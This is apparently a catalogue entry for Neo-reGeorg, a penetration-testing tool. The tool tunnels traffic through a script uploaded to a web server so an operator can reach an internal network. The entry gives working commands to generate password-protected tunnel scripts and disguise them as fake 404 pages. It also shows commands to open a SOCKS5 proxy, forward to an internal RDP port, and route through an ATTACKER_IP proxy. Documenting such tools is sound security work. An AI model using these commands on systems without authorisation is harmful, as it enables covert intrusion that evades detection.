---
name: "neo-regeorg"
categories:
  - blackarch-tunnel
version: "v5.3.0.r3.g5357264"
homepage: "https://github.com/L-codes/Neo-reGeorg"
packaged-by: [blackarch]
blackarch-builddate: "2026-08-24"
build-system: scripts
license: GPL3
meta-checked: "2026-11-09"
github-repo: "L-codes/Neo-reGeorg"
github-stars: 3440
github-pushed: "2026-08-14"
github-archived: false
github-issues: 7
github-match: "exact"
gh-checked: "2026-11-07"
worth: 6.8
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 7
gh-activity-checked: "2026-11-09"
---

# neo-regeorg

> Actively maintained rework of reGeorg — HTTP(S) tunnelling to a SOCKS5 proxy or port forward, with password-protected tunnel scripts, traffic masking and request customization.

## What it's for

Neo-reGeorg (L-codes) serves the same purpose as [[regeorg]] — pivoting through a web server that only lets HTTP(S) out — but fixes its ancestor's weaknesses: tunnel scripts are generated with a password and encrypt/obfuscate their traffic (mangled base64 over a BLV framing) so the channel does not look like a plain reGeorg tunnel; responses to casual visitors can be disguised as an arbitrary page and status code; and it handles hostile environments (load balancers, missing cookies, required proxies, NTLM). Two steps: generate the server-side script for the target's language (`tunnel.php/.aspx/.ashx/.jsp/.jspx`, plus a Go standalone), upload it, then connect with the client, which by default opens a SOCKS5 proxy on 127.0.0.1:1080. Runs on Python 2 or 3; TCP only, with the speed limits inherent in HTTP-relayed tunnels.

## Typical use cases

### Generate password-protected tunnel scripts

```
neo-regeorg generate -k Password1
```

Outcome: writes the server-side files for every supported language into `neoreg_servers/` (`tunnel.jsp`, `tunnel.jspx`, `tunnel.ashx`, `tunnel.aspx`, `tunnel.php`, `tunnel.go`), all keyed to the given password; upload the one matching the target web server.

### Connect and raise a local SOCKS5 proxy

```
neo-regeorg -k Password1 -u http://target.example.com/tunnel.php
```

Outcome: the client verifies the tunnel script and starts a SOCKS5 server on 127.0.0.1:1080 (banner: `Starting socks server [127.0.0.1:1080]`); proxychains and SOCKS-aware tools can now reach the target's internal network. Add `-v` for request-level debugging.

### Disguise the tunnel script as an ordinary 404 page

```
neo-regeorg generate -k Password1 --file 404.html --httpcode 404
```

Outcome: generated scripts answer direct browsing with the contents of `404.html` and status 404, so the file looks like a broken link; connect afterwards with `neo-regeorg -k Password1 -u <url> --skip` to bypass the connectivity self-test that would interpret the fake error as failure.

### Forward one port instead of a SOCKS proxy

```
neo-regeorg -k Password1 -u http://target.example.com/tunnel.php -t 198.51.100.10:3389
```

Outcome: instead of SOCKS5, the client listens locally and forwards its traffic through the HTTP tunnel to exactly `198.51.100.10:3389` as seen from the web server — convenient when a single internal service (RDP, SSH, a database) is all you need.

### Connect through a required proxy with custom headers

```
neo-regeorg -k Password1 -u http://target.example.com/tunnel.php -x socks5://ATTACKER_IP:8080 -H 'Authorization: cm9vdDpvdmVy' --cookie "key=value;key2=value2"
```

Outcome: tunnel traffic reaches the web server via the declared upstream proxy (`--proxy`, `Proto://host[:port]`) with the extra header and cookies attached on every request — the pattern for egress-controlled environments where the tunnel script is only reachable through an authenticated corporate proxy.

*No corpus evidence — derived from upstream documentation.*
